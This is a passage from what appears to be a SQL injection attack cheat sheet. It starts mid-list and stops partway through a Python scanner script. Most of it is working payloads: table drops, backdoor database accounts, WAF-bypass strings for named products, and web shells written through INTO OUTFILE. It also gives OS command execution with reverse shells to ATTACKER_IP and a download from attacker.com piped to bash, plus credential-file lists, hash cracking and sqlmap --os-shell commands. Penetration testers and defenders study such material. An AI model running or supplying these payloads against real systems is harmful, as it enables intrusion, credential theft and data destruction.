'; TRUNCATE TABLE audit_log; --

# Drop tables (extremely destructive!)
'; DROP TABLE backup_users; --
```

```text [Create New Tables / Stored Procedures]
# Create exfiltration table
'; CREATE TABLE exfil (id INT AUTO_INCREMENT PRIMARY KEY, data TEXT); --
'; INSERT INTO exfil (data) SELECT GROUP_CONCAT(username,':',password) FROM users; --

# MSSQL — Create stored procedure backdoor
'; CREATE PROCEDURE sp_backdoor @cmd NVARCHAR(4000) AS EXEC xp_cmdshell @cmd; --
'; EXEC sp_backdoor 'whoami'; --
```

```text [Grant Privileges]
# MySQL — Grant all privileges
'; GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' IDENTIFIED BY 'password123' WITH GRANT OPTION; FLUSH PRIVILEGES; --

# PostgreSQL — Create superuser
'; CREATE USER backdoor WITH SUPERUSER PASSWORD 'password123'; --
'; ALTER USER backdoor WITH SUPERUSER; --

# MSSQL — Add sysadmin
'; EXEC sp_addsrvrolemember 'backdoor','sysadmin'; --
```
::

---

## WAF Bypass Techniques

::warning
Web Application Firewalls (WAFs) attempt to block SQL injection by detecting malicious patterns. These bypass techniques exploit gaps in pattern matching, encoding, and parsing differences between the WAF and the database.
::

::accordion
  :::accordion-item{icon="i-lucide-case-sensitive" label="Case & Keyword Manipulation"}

  ::code-group
  ```text [Case Variation]
  ' uNiOn SeLeCt 1,2,3 --
  ' UnIoN sElEcT 1,2,3 --
  ' UNION SELECT 1,2,3 --
  ' union select 1,2,3 --
  ' Union Select 1,2,3 --
  ```

  ```text [Keyword Splitting with Comments]
  ' UN/**/ION SE/**/LECT 1,2,3 --
  ' UNI%0bON SE%0bLECT 1,2,3 --
  ' /*!UNION*/ /*!SELECT*/ 1,2,3 --
  ' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3 --
  ' %55NION %53ELECT 1,2,3 --
  ' UN%49ON SEL%45CT 1,2,3 --
  ```

  ```text [Alternative Keywords]
  # Instead of UNION SELECT
  ' UNION ALL SELECT 1,2,3 --
  ' UNION DISTINCT SELECT 1,2,3 --

  # Instead of OR
  ' || 1=1 --
  ' && 1=1 --

  # Instead of AND
  ' %26%26 1=1 --
  ' && 1=1 --

  # Instead of =
  ' LIKE 'admin
  ' IN ('admin')
  ' BETWEEN 'admin' AND 'admin'
  ' REGEXP 'admin'
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-binary" label="Encoding Bypass"}

  ::code-group
  ```text [URL Encoding]
  # Single encoding
  %27%20OR%20%271%27%3D%271
  %27%20UNION%20SELECT%201%2C2%2C3%20--

  # Double encoding
  %2527%2520OR%2520%25271%2527%253D%25271
  %2527%2520UNION%2520SELECT%25201%252C2%252C3--

  # Mixed encoding
  ' %55NION %53ELECT 1,2,3 --
  %27 UNION SELECT 1,2,3 --
  ```

  ```text [Unicode Encoding]
  # Unicode representation
  %u0027%u0020OR%u0020%u0027%u0031%u0027%u003D%u0027%u0031
  ＇ OR ＇１＇＝＇１    (full-width characters)
  ```

  ```text [Hex Encoding]
  # MySQL hex strings
  ' UNION SELECT 0x61646d696e,0x70617373776f7264,NULL,NULL --
  # 0x61646d696e = "admin"
  # 0x70617373776f7264 = "password"

  # Using CHAR()
  ' UNION SELECT CHAR(97,100,109,105,110),NULL,NULL,NULL --

  # Hex in WHERE
  ' OR username=0x61646d696e --
  ```

  ```text [Base64 in JSON]
  # If application decodes base64 input
  {"query": "JyBVTklPTiBTRUxFQ1QgMSwyLDMgLS0="}
  # Decodes to: ' UNION SELECT 1,2,3 --
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-message-square" label="Comment-Based Bypass"}

  ::code-group
  ```text [Inline Comments]
  # MySQL version-specific comments
  /*!50000UNION*//*!50000SELECT*/1,2,3--
  /*!UNION*//*!SELECT*/1,2,3--

  # Standard comments
  '/**/UNION/**/SELECT/**/1,2,3--
  '/**/OR/**/1=1--

  # Nested comments (PostgreSQL)
  '/**/UN/**/ION/**/SE/**/LE/**/CT/**/1,2,3--

  # Comment with whitespace variants
  ' UNION%23%0aSELECT 1,2,3 --
  ' UNION%23randomtext%0aSELECT 1,2,3 --
  ' UNION -- comment%0aSELECT 1,2,3 --
  ```

  ```text [MySQL Specific Comments]
  # MySQL conditional comments
  /*!00000UNION*/+/*!00000SELECT*/+1,2,3--
  
  # With version gates
  /*!50000UNION*/+/*!50000ALL*/+/*!50000SELECT*/+1,2,3--
  /*!40000UNION*/+/*!40000SELECT*/+1,2,3--
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-space" label="Whitespace & Special Characters"}

  ::code-group
  ```text [Whitespace Alternatives]
  # Tab
  ' UNION%09SELECT%091,2,3 --

  # Newline
  ' UNION%0aSELECT%0a1,2,3 --

  # Carriage return
  ' UNION%0dSELECT%0d1,2,3 --

  # Vertical tab
  ' UNION%0bSELECT%0b1,2,3 --

  # Form feed
  ' UNION%0cSELECT%0c1,2,3 --

  # Non-breaking space
  ' UNION%a0SELECT%a01,2,3 --

  # Multiple spaces
  ' UNION          SELECT 1,2,3 --

  # Parentheses as separator
  'UNION(SELECT(1),(2),(3))--
  '+(UNION)+(SELECT)+(1),(2),(3)--
  ```

  ```text [Null Bytes]
  ' UNION%00SELECT 1,2,3 --
  '%00' UNION SELECT 1,2,3 --
  ' UNION SELECT 1,2,3%00 --
  ```

  ```text [Plus Sign as Space]
  '+UNION+SELECT+1,2,3--
  '+OR+1=1--
  '+AND+1=1--
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-regex" label="Logic & Operator Bypass"}

  ::code-group
  ```text [Alternative Boolean Logic]
  # Instead of OR 1=1
  ' OR 'a'='a
  ' OR 1 LIKE 1
  ' OR 1 IN (1)
  ' OR 1 BETWEEN 0 AND 2
  ' OR 1 REGEXP 1
  ' OR 1 IS NOT NULL
  ' OR NOT 0
  ' OR 'ab'='a'+'b'    (MSSQL)
  ' OR 'ab'='a'||'b'   (Oracle/PG)

  # Instead of AND 1=1
  ' AND 'a' LIKE 'a
  ' AND 1 IN (1)
  ' AND 1<2
  ' AND 1!=2
  ' AND NOT 1=2
  ```

  ```text [No Quotes]
  # Avoid quotes entirely
  ' OR 1=1 --
  ' OR username LIKE 0x61646d696e --
  ' OR username=CHAR(97,100,109,105,110) --
  ' UNION SELECT * FROM users WHERE id=1 --
  ```

  ```text [No Spaces]
  'OR(1=1)--
  'UNION(SELECT(1),(2),(3))--
  'AND(SELECT(1)FROM(users)WHERE(username)='admin')--
  'OR'1'='1'--
  1'OR'1'LIKE'1
  ```

  ```text [No Commas]
  # UNION without commas
  ' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c --

  # LIMIT without commas
  ' UNION SELECT * FROM users LIMIT 1 OFFSET 0 --

  # SUBSTRING without commas
  ' AND SUBSTRING(database() FROM 1 FOR 1)='t' --
  ' AND MID(database() FROM 1 FOR 1)='t' --
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="WAF-Specific Bypass"}

  ::code-group
  ```text [Cloudflare Bypass]
  /*!50000%55nion*/ /*!50000%53elect*/ 1,2,3--
  %55nion(%53elect 1,2,3)--
  +un/**/ion+se/**/lect+1,2,3--
  +UnIoN/*&a=*/SeLeCT/*&a=*/1,2,3--
  %55nion(%53elect 1,2,3)-- -
  /*!%55NiOn*/ /*!%53eLEct*/ 1,2,3 --
  ```

  ```text [ModSecurity Bypass]
  ' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3 /*!50000FROM*/ users--
  ' un%0bion se%0blect 1,2,3--
  ' UNION%23aa%0aSELECT 1,2,3--
  ' /*!UNION*/ /*!SELECT*/ 1,2,3 /*!FROM*/ users /*!WHERE*/ 1=1--
  ```

  ```text [AWS WAF Bypass]
  ' AND 1=1--/**/ 
  '+AND+'1'='1
  ' %26%26 '1'='1
  ' /*!UNION*/ /*!ALL*/ /*!SELECT*/ 1,2,3--
  ```

  ```text [Generic Bypass Patterns]
  # HPP (HTTP Parameter Pollution)
  ?id=1 UNION/*&id=*/ SELECT 1,2,3--

  # Chunked transfer encoding
  # Split payload across chunks in Transfer-Encoding: chunked

  # Content-Type switching
  # JSON instead of form-urlencoded or vice versa

  # Parameter name variation
  ?ID=1' OR 1=1--
  ?Id=1' OR 1=1--
  ?iD=1' OR 1=1--
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-puzzle" label="Advanced Evasion"}

  ::code-group
  ```text [Scientific Notation]
  # Using scientific notation to bypass numeric filters
  ?id=0e1UNION SELECT 1,2,3--
  ?id=1e0UNION SELECT 1,2,3--
  ?id=1.0UNION SELECT 1,2,3--
  ```

  ```text [String Concatenation Evasion]
  # MySQL
  ' UNION SELECT CONCAT('ad','min'),NULL,NULL,NULL --
  ' UNION SELECT 'ad' 'min',NULL,NULL,NULL --     # space concat
  ' OR username=CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110)) --

  # PostgreSQL
  ' UNION SELECT 'ad'||'min',NULL,NULL,NULL --

  # MSSQL
  ' UNION SELECT 'ad'+'min',NULL,NULL,NULL --
  ```

  ```text [Subquery Evasion]
  # Wrap in subqueries to confuse pattern matching
  ' AND (SELECT 1)=1 --
  ' AND (SELECT 1 FROM (SELECT 1)x)=1 --
  ' AND 1=(SELECT 1 FROM dual WHERE 1=1) --  # Oracle

  # UNION in subquery
  ' AND 1=(SELECT TOP 1 1 FROM users)--
  ' AND EXISTS(SELECT * FROM users WHERE username='admin')--
  ```

  ```text [JSON / XML Function Evasion]
  # MySQL JSON functions
  ' UNION SELECT JSON_EXTRACT('{"a":"1"}','$.a'),NULL,NULL,NULL --
  ' AND JSON_VALID(database()) --

  # PostgreSQL JSON
  ' UNION SELECT to_json(username)::TEXT,NULL,NULL,NULL FROM users --

  # XML functions
  ' UNION SELECT EXTRACTVALUE(1,CONCAT(0x7e,database())) --
  ```
  ::
  :::
::

---

## Injection Point Discovery — Beyond Parameters

::tip
SQL Injection isn't limited to URL parameters and login forms. Attackers inject into **any input** that reaches a SQL query — including headers, cookies, filenames, and API fields.
::

::tabs
  :::tabs-item{icon="i-lucide-globe" label="HTTP Headers"}

  ::code-group
  ```http [User-Agent Injection]
  GET /page HTTP/1.1
  Host: target.com
  User-Agent: ' OR 1=1 --
  User-Agent: Mozilla/5.0' AND SLEEP(5) AND '1'='1
  User-Agent: ' UNION SELECT username,password,3,4 FROM users --
  ```

  ```http [Referer Injection]
  GET /page HTTP/1.1
  Host: target.com
  Referer: ' OR 1=1 --
  Referer: https://target.com/page' UNION SELECT 1,2,3 --
  ```

  ```http [X-Forwarded-For Injection]
  GET /page HTTP/1.1
  Host: target.com
  X-Forwarded-For: ' OR 1=1 --
  X-Forwarded-For: 127.0.0.1' UNION SELECT username,password FROM users --
  ```

  ```http [Cookie Injection]
  GET /dashboard HTTP/1.1
  Host: target.com
  Cookie: session=abc123; user_id=1' OR 1=1 --
  Cookie: session=abc123; tracking_id=' UNION SELECT password FROM users WHERE username='admin' --
  Cookie: preference=en' AND SLEEP(5) --
  ```

  ```http [Accept-Language Injection]
  GET /page HTTP/1.1
  Host: target.com
  Accept-Language: en' OR 1=1 --
  Accept-Language: en' UNION SELECT username FROM users --
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-braces" label="JSON / XML / GraphQL"}

  ::code-group
  ```http [JSON API Injection]
  POST /api/search HTTP/1.1
  Content-Type: application/json

  {"search": "laptop' UNION SELECT username,password,3 FROM users --"}
  {"filter": {"category": "1' OR 1=1 --"}}
  {"sort": "name; DROP TABLE users; --"}
  {"id": "1 UNION SELECT 1,2,3,4 --"}
  {"query": "' OR ''='"}
  ```

  ```http [XML / SOAP Injection]
  POST /api/service HTTP/1.1
  Content-Type: application/xml

  <?xml version="1.0"?>
  <search>
    <query>laptop' UNION SELECT username,password FROM users --</query>
    <category>1' OR 1=1 --</category>
  </search>
  ```

  ```http [GraphQL Injection]
  POST /graphql HTTP/1.1
  Content-Type: application/json

  {
    "query": "{ products(search: \"' UNION SELECT username,password FROM users --\") { name } }"
  }

  {
    "query": "{ user(id: \"1' OR 1=1 --\") { name email } }"
  }

  # Via variables
  {
    "query": "query ($id: String!) { user(id: $id) { name } }",
    "variables": {"id": "1' UNION SELECT password FROM users WHERE username='admin' --"}
  }
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-file" label="File & Misc Inputs"}

  ::code-group
  ```text [Filename Injection]
  # Upload a file with SQLi in the filename
  # Filename: test' OR 1=1 --.jpg
  # Filename: '; DROP TABLE files; --.pdf
  # Filename: ' UNION SELECT username,password FROM users --.png
  ```

  ```text [Search / Sort / Filter Parameters]
  # ORDER BY injection
  ?sort=name' AND SLEEP(5) --
  ?sort=1;SELECT SLEEP(5)
  ?order=name,(SELECT SLEEP(5))
  ?orderby=id AND 1=1 --

  # LIMIT / OFFSET injection
  ?page=1&limit=10 UNION SELECT 1,2,3 --
  ?offset=0;SELECT SLEEP(5)

  # Search filters
  ?filter[name]=admin' OR 1=1 --
  ?filter={"status": "active' OR '1'='1"}
  ?search=test%27+OR+1%3D1+--
  ```

  ```text [Registration / Profile Fields]
  # First name / Last name
  First Name: admin' UNION SELECT password FROM users WHERE username='admin' --
  Last Name: '; INSERT INTO users VALUES('hacker','pass','admin'); --

  # Email field
  test@test.com' UNION SELECT 1,2,3 --

  # Address fields
  123 Main St'; UPDATE users SET role='admin' WHERE username='attacker'; --

  # Bio / Description
  About me'; (SELECT password FROM users WHERE id=1); --
  ```
  ::
  :::
::

---

## Privilege Escalation via SQL Injection

::warning
SQL Injection provides one of the most powerful privilege escalation paths in web security — from **database read access** all the way to **full operating system control**.
::

### How PrivEsc Works

::tabs
  :::tabs-item{icon="i-lucide-layers" label="PrivEsc Chain"}

  | Step | Technique | Access Level |
  |------|-----------|-------------|
  | 1 | SQL Injection — Read | Extract usernames, password hashes |
  | 2 | Crack password hashes | Valid credentials for application |
  | 3 | Admin panel access | Application admin privileges |
  | 4 | SQL Injection — Write | INSERT admin account, modify data |
  | 5 | SQL Injection — File Read | Read server config files, source code |
  | 6 | SQL Injection — File Write | Write web shell to document root |
  | 7 | Web shell — RCE | Command execution as web server user |
  | 8 | Reverse shell | Interactive OS shell |
  | 9 | Local privilege escalation | Root/SYSTEM access |
  | 10 | Domain controller / lateral movement | Enterprise compromise |

  :::

  :::tabs-item{icon="i-lucide-terminal" label="OS Command Execution"}

  ::code-group
  ```text [MySQL → OS Commands]
  # Via INTO OUTFILE (write web shell)
  ' UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --

  # Via UDF (User Defined Functions)
  # 1. Write shared library
  ' UNION SELECT unhex('...UDF_binary_hex...') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so' --
  # 2. Create function
  '; CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so'; --
  # 3. Execute
  '; SELECT sys_exec('id > /tmp/output'); --
  '; SELECT sys_exec('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"'); --

  # Via General Log (write to web root)
  '; SET GLOBAL general_log=1; --
  '; SET GLOBAL general_log_file='/var/www/html/shell.php'; --
  '; SELECT '<?php system($_GET["cmd"]); ?>'; --
  '; SET GLOBAL general_log=0; --
  ```

  ```text [PostgreSQL → OS Commands]
  # Via COPY TO PROGRAM
  '; COPY (SELECT '') TO PROGRAM 'id > /tmp/output'; --
  '; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"'; --
  '; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/shell.sh | bash'; --

  # Via large objects
  '; SELECT lo_import('/etc/passwd',12345); --
  '; SELECT lo_export(12345,'/var/www/html/passwd.txt'); --

  # Via PL/Python (if installed)
  '; CREATE OR REPLACE FUNCTION cmd(c TEXT) RETURNS TEXT AS $$ import subprocess; return subprocess.check_output(c, shell=True).decode() $$ LANGUAGE plpython3u; --
  '; SELECT cmd('id'); --
  '; SELECT cmd('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"'); --

  # Via PL/Perl (if installed)
  '; CREATE OR REPLACE FUNCTION cmd(TEXT) RETURNS TEXT AS $$ return `$_[0]` $$ LANGUAGE plperlu; --
  '; SELECT cmd('id'); --
  ```

  ```text [MSSQL → OS Commands]
  # Via xp_cmdshell
  '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; --
  '; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; --
  '; EXEC xp_cmdshell 'whoami'; --
  '; EXEC xp_cmdshell 'net user hacker Password123! /add'; --
  '; EXEC xp_cmdshell 'net localgroup Administrators hacker /add'; --
  '; EXEC xp_cmdshell 'powershell -e BASE64_ENCODED_PAYLOAD'; --
  '; EXEC xp_cmdshell 'certutil -urlcache -split -f http://attacker.com/shell.exe C:\Windows\Temp\shell.exe'; --
  '; EXEC xp_cmdshell 'C:\Windows\Temp\shell.exe'; --

  # Via OLE Automation
  '; DECLARE @s INT; EXEC sp_oacreate 'wscript.shell',@s OUT; EXEC sp_oamethod @s,'run',NULL,'cmd /c whoami > C:\inetpub\wwwroot\output.txt'; --

  # Via SQL Agent Jobs
  '; USE msdb; EXEC sp_add_job @job_name='backdoor'; --
  '; EXEC sp_add_jobstep @job_name='backdoor',@step_name='exec',@subsystem='CmdExec',@command='whoami > C:\output.txt'; --
  '; EXEC sp_start_job 'backdoor'; --

  # Via CLR Assembly (advanced)
  -- Create assembly from hex, create procedure, execute
  ```

  ```text [Oracle → OS Commands]
  # Via Java (if installed)
  '; EXEC DBMS_JAVA.GRANT_PERMISSION('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','execute'); --
  
  # Create Java class for command execution
  '; CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "cmd" AS
  import java.io.*;
  public class cmd {
    public static String exec(String c) throws Exception {
      Process p = Runtime.getRuntime().exec(c);
      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
      String l, o = "";
      while ((l = br.readLine()) != null) o += l + "\n";
      return o;
    }
  }; --

  # Create PL/SQL wrapper
  '; CREATE OR REPLACE FUNCTION os_cmd(c VARCHAR2) RETURN VARCHAR2 AS LANGUAGE JAVA NAME 'cmd.exec(java.lang.String) return java.lang.String'; --

  # Execute
  '; SELECT os_cmd('id') FROM dual; --
  '; SELECT os_cmd('/bin/bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"') FROM dual; --

  # Via DBMS_SCHEDULER
  '; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'pwn',job_type=>'EXECUTABLE',job_action=>'/bin/bash',number_of_arguments=>2,enabled=>FALSE); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('pwn',1,'-c'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('pwn',2,'id > /tmp/out'); DBMS_SCHEDULER.ENABLE('pwn'); END; --
  ```

  ```text [SQLite → OS Commands]
  # SQLite doesn't have native command execution
  # But can write files via ATTACH DATABASE
  
  '; ATTACH DATABASE '/var/www/html/shell.php' AS pwn; --
  '; CREATE TABLE pwn.cmd (code TEXT); --
  '; INSERT INTO pwn.cmd VALUES ('<?php system($_GET["c"]); ?>'); --

  # Load extensions (if enabled)
  '; SELECT load_extension('/path/to/malicious.so'); --
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-key-round" label="Credential Extraction"}

  ::code-group
  ```text [Extract & Crack Password Hashes]
  # MySQL password hashes
  ' UNION SELECT user,authentication_string,3,4 FROM mysql.user --
  ' UNION SELECT user,password,3,4 FROM mysql.user --

  # PostgreSQL password hashes
  ' UNION SELECT usename,passwd,3,4 FROM pg_shadow --

  # MSSQL password hashes
  ' UNION SELECT name,password_hash,3,4 FROM sys.sql_logins --
  ' UNION SELECT name,master.dbo.fn_varbintohexstr(password_hash),3,4 FROM sys.sql_logins --

  # Oracle password hashes
  ' UNION SELECT username,password,3,4 FROM dba_users --
  ' UNION SELECT name,password,spare4,4 FROM sys.user$ --
  ```

  ```bash [Crack with hashcat]
  # MySQL 5.x hash (SHA1)
  hashcat -a 0 -m 300 hashes.txt /usr/share/wordlists/rockyou.txt

  # MySQL 4.x hash
  hashcat -a 0 -m 200 hashes.txt /usr/share/wordlists/rockyou.txt

  # PostgreSQL MD5
  hashcat -a 0 -m 12 hashes.txt /usr/share/wordlists/rockyou.txt

  # MSSQL 2012+ (SHA-512)
  hashcat -a 0 -m 1731 hashes.txt /usr/share/wordlists/rockyou.txt

  # MSSQL 2005 (SHA-1)
  hashcat -a 0 -m 132 hashes.txt /usr/share/wordlists/rockyou.txt

  # Oracle 11g+ (SHA-1)
  hashcat -a 0 -m 112 hashes.txt /usr/share/wordlists/rockyou.txt

  # bcrypt (application passwords)
  hashcat -a 0 -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

  # John the Ripper alternative
  john --wordlist=/usr/share/wordlists/rockyou.txt --format=mysql-sha1 hashes.txt
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-file-search" label="Sensitive File Read"}

  ::code-group
  ```text [Linux System Files]
  # Via LOAD_FILE (MySQL) or pg_read_file (PostgreSQL)
  /etc/passwd
  /etc/shadow
  /etc/hosts
  /etc/hostname
  /etc/os-release
  /proc/self/environ
  /proc/self/cmdline
  /proc/version
  /root/.bash_history
  /root/.ssh/id_rsa
  /root/.ssh/authorized_keys
  /home/*/.bash_history
  /home/*/.ssh/id_rsa
  ```

  ```text [Application Config Files]
  /var/www/html/.env
  /var/www/html/config.php
  /var/www/html/wp-config.php
  /var/www/html/configuration.php
  /var/www/html/config/database.yml
  /var/www/html/config/database.php
  /var/www/html/app/config/parameters.yml
  /var/www/html/.git/config
  /var/www/html/composer.json
  /var/www/html/package.json
  /opt/app/.env
  /opt/app/config/secrets.yml
  ```

  ```text [Windows System Files]
  C:\Windows\System32\drivers\etc\hosts
  C:\Windows\System32\config\SAM
  C:\Windows\repair\SAM
  C:\inetpub\wwwroot\web.config
  C:\Windows\win.ini
  C:\boot.ini
  C:\Users\Administrator\.ssh\id_rsa
  C:\xampp\apache\conf\httpd.conf
  C:\xampp\mysql\bin\my.ini
  C:\xampp\php\php.ini
  ```

  ```text [Cloud Metadata]
  # AWS — via SSRF through SQLi file read
  # URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  # Note: Can't directly LOAD_FILE a URL, but can combine with SSRF
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-server" label="Post-Exploitation"}

  ::code-group
  ```bash [Reverse Shell After Web Shell]
  # Bash reverse shell
  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

  # Python reverse shell
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

  # PowerShell reverse shell (Windows)
  powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($t);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
  ```

  ```bash [Linux Local PrivEsc After Shell]
  # Enumerate system
  id && whoami && hostname
  uname -a
  cat /etc/os-release

  # Find SUID binaries
  find / -perm -4000 -type f 2>/dev/null

  # Check sudo privileges
  sudo -l

  # Find writable directories
  find / -writable -type d 2>/dev/null

  # Check cron jobs
  cat /etc/crontab
  ls -la /etc/cron*
  crontab -l

  # Find credentials in files
  find / -name "*.conf" -o -name "*.cfg" -o -name ".env" -o -name "*.ini" 2>/dev/null | xargs grep -il "password\|passwd\|secret\|key\|token" 2>/dev/null

  # Check for docker
  ls -la /var/run/docker.sock
  docker ps

  # Network information
  ip a && ss -tlnp && cat /etc/hosts
  ```

  ```bash [Windows Local PrivEsc After Shell]
  # System info
  whoami /all
  systeminfo
  hostname
  net user

  # Check privileges
  whoami /priv
  
  # Service misconfigurations
  wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"

  # Scheduled tasks
  schtasks /query /fo LIST /v

  # Find passwords
  findstr /si password *.xml *.ini *.txt *.config
  reg query HKLM /f password /t REG_SZ /s
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

  # AlwaysInstallElevated
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ```
  ::
  :::
::

---

## Automated Exploitation Tools

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="sqlmap Commands"}

  ::code-group
  ```bash [Basic Usage]
  # Basic detection
  sqlmap -u "https://target.com/page?id=1" --batch

  # With POST data
  sqlmap -u "https://target.com/login" --data="username=admin&password=test" --batch

  # Specify parameter
  sqlmap -u "https://target.com/page?id=1&sort=name" -p "id" --batch

  # With cookies
  sqlmap -u "https://target.com/page?id=1" --cookie="session=abc123" --batch

  # With headers
  sqlmap -u "https://target.com/page" --headers="X-Forwarded-For: 1*\nUser-Agent: test*" --batch

  # From Burp request file
  sqlmap -r request.txt --batch
  ```

  ```bash [Database Enumeration]
  # Get databases
  sqlmap -u "https://target.com/page?id=1" --dbs --batch

  # Get tables
  sqlmap -u "https://target.com/page?id=1" -D target_db --tables --batch

  # Get columns
  sqlmap -u "https://target.com/page?id=1" -D target_db -T users --columns --batch

  # Dump data
  sqlmap -u "https://target.com/page?id=1" -D target_db -T users -C username,password --dump --batch

  # Dump everything
  sqlmap -u "https://target.com/page?id=1" -D target_db --dump-all --batch

  # Search for specific data
  sqlmap -u "https://target.com/page?id=1" --search -C password --batch
  ```

  ```bash [Advanced Exploitation]
  # OS shell
  sqlmap -u "https://target.com/page?id=1" --os-shell --batch

  # OS command
  sqlmap -u "https://target.com/page?id=1" --os-cmd="whoami" --batch

  # SQL shell
  sqlmap -u "https://target.com/page?id=1" --sql-shell --batch

  # File read
  sqlmap -u "https://target.com/page?id=1" --file-read="/etc/passwd" --batch

  # File write (web shell)
  sqlmap -u "https://target.com/page?id=1" --file-write="./shell.php" --file-dest="/var/www/html/shell.php" --batch

  # Crack password hashes
  sqlmap -u "https://target.com/page?id=1" -D target_db -T users --dump --passwords --batch
  ```

  ```bash [Evasion & Optimization]
  # WAF bypass with tamper scripts
  sqlmap -u "https://target.com/page?id=1" --tamper="space2comment,between,randomcase" --batch

  # Available tamper scripts
  sqlmap --list-tampers

  # Common tamper combinations
  sqlmap -u "URL" --tamper="apostrophemask,equaltolike,space2comment,greatest" --batch
  sqlmap -u "URL" --tamper="between,randomcase,space2dash" --batch
  sqlmap -u "URL" --tamper="charencode,space2comment" --batch
  sqlmap -u "URL" --tamper="base64encode" --batch

  # Increase threads & optimize
  sqlmap -u "URL" --threads=10 --level=5 --risk=3 --batch

  # Specific technique
  sqlmap -u "URL" --technique=BEUSTQ --batch
  # B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline query

  # Random user agent
  sqlmap -u "URL" --random-agent --batch

  # Proxy through Burp
  sqlmap -u "URL" --proxy="http://127.0.0.1:8080" --batch

  # TOR routing
  sqlmap -u "URL" --tor --tor-type=SOCKS5 --check-tor --batch

  # Second-order injection
  sqlmap -u "https://target.com/register" --data="name=test*" --second-url="https://target.com/profile" --batch
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-code" label="Custom Python Script"}

  ::code-collapse

  ```python [sqli_scanner.py]
  #!/usr/bin/env python3
  """
  SQL Injection Scanner — Multi-Technique Detection
  Tests for Union, Error, Boolean, and Time-based injection
  For authorized penetration testing only
  """

  import requests
  import sys
  import time
  import re
  import json
  from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
  from dataclasses import dataclass, asdict
  from typing import List, Optional, Tuple

  @dataclass
  class SQLiResult:
      parameter: str
      technique: str
      payload: str
      vulnerable: bool
      evidence: str
      severity: str
      database_type: str = "unknown"

  class SQLiScanner:
      
      DB_ERRORS = {
          'mysql': [
              r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
              r"valid MySQL result", r"check the manual that corresponds to your MySQL",
              r"MySqlClient\.", r"com\.mysql\.jdbc", r"Unclosed quotation mark",
              r"SQLSTATE\[HY000\]", r"mysql_fetch"
          ],
          'postgresql': [
              r"PostgreSQL.*ERROR", r"Warning.*\Wpg_", r"valid PostgreSQL result",
              r"Npgsql\.", r"PG::SyntaxError", r"org\.postgresql\.util",
              r"ERROR:\s+syntax error at or near", r"PSQLException"
          ],
          'mssql': [
              r"Driver.*SQL[\-\_\ ]*Server", r"OLE DB.*SQL Server",
              r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_",
              r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
              r"Microsoft SQL Native Client error",
              r"ODBC SQL Server Driver", r"SQLServer JDBC Driver",
              r"com\.microsoft\.sqlserver\.jdbc", r"Msg \d+, Level \d+"
          ],
          'oracle': [
              r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error",
              r"Oracle.*Driver", r"Warning.*\Woci_", r"Warning.*\Wora_",
              r"oracle\.jdbc", r"OracleException"
          ],
          'sqlite': [
              r"SQLite/JDBCDriver", r"SQLite\.Exception",
              r"System\.Data\.SQLite\.SQLiteException", r"Warning.*sqlite_",
              r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]",
              r"SQLite error \d+:", r"sqlite3\.OperationalError"
          ]
      }

      BOOLEAN_PAYLOADS = [
          ("' AND '1'='1", "' AND '1'='2"),
